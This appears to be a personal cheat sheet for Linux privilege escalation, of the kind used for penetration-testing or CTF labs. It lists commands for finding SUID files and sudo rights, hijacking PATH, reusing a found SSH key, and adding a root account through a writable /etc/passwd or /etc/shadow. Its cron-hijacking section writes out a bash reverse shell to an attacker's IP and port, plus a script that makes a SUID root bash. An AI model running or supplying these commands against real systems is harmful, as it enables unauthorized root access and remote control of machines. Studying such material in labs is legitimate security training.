### Basics
```
find / -perm -u=s -type f 2>/dev/null
```
search file system for SUID files.
```
sudo -l
```
check sudo rights.
```
export PATH=<path>:$PATH
```
update the path.
Check `~/.*history` for credentials.
___
### ssh
**Precondition:** key file (id_rsa) found.
```
chmod 600 id_rsa
ssh -i id_rsa <username>@<ip>
```
remote login using ssh.
___
### /etc/passwd
**Precondition:** write access to the file.
Add line: `<username>:<password>:0:0:root:/root:/bin/bash`.
`openssl passwd -1 [-salt <salt>] <password>` to generate a password.
___
### /etc/shadow
**Precondition:** write access to the file.
_line format:_ `<user>:<password>:...`.
`mkpasswd -m sha-512 <password>` to generate a password.
___
### /etc/crontab
_line format:_ `<id> <minute> <hour> <day of the month> <month> <day of the week> <user> <command>`.
Find a line where command file can be altered or overwritten with same filename in a different path.
```
#!/bin/bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```
reverse shell script.
```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
script to generate a superuser shell.
Then, after script is run from crontab, run `/tmp/rootbash`.